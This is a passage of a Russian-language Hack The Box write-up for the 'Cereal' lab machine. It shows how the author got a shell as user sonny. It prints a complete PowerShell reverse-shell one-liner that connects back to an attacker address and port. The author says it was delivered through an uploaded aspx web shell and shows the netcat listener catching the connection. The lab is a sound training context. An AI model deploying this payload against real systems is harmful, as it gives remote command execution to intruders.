# 40 – Shell as sonny

Я хотел получить полноценный оболочку с powershell. Я нашёл несколько примеров:
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)
- [https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)
- [https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1](https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1)

В итоге я выбрал этот вариант из [https://hackersinterview.com/oscp/reverse-shell-one-liners-oscp-cheatsheet/]:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.92',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Я вставил этот код в свою оболочку по адресу `http://source.cereal.htb/uploads/oops.aspx`, и получил результат!

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal/test-www]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.92] from (UNKNOWN) [10.10.10.217] 55785
whoami
cereal\sonny
PS C:\windows\system32\inetsrv> 
```

## Заключение

Я оставлю всё на этом — это всё, что я смог добиться с помощью оболочки. Я немного выполнил Windows-опросление, но ничего особенного для описания не было.

Возможно, однажды вернусь к этому — но пока я горжусь собой за то, что разобрался в этом с относительно малым количеством подсказок (и множеством ночей). Спасибо Hack the Box!
